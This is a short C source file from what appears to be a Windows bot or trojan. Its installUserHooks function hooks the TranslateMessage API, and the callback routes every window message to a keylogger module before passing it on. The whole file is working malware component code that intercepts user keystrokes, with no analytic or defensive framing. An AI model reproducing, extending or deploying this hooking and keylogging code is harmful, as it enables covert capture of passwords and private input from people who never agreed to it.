#include "userhooks.h"

#include "modules.h"

#include "..\common\hooking.h"

#include "hook_manager.h"
#include "keylogger.h"

ptTranslateMessage oTranslateMessage;

extern bot_t bot;

BOOL WINAPI TranslateMessage_Callback(const MSG* pMsg)
{
#ifdef MODULE_KEYLOGGER
	Keylogger_TranslateMessage(pMsg);
#endif
	return oTranslateMessage(pMsg);
}

void installUserHooks(void)
{
	DWORD i;

	hook_t hooks[] =
	{
		{bot.api.pTranslateMessage, &TranslateMessage_Callback, (LPVOID*)&oTranslateMessage, 0}
	};

	for(i = 0; i < sizeof(hooks) / sizeof(hook_t); i++)
	{
		if((*hooks[i].lpOriginalFunction = HookRemoteFunctionEx(CURRENT_PROCESS, hooks[i].lpFunctionAddress, hooks[i].lpCallbackAddress, &hooks[i].dwLength)) != NULL)
		{
			AddHook(hooks[i]);
		}
	}
}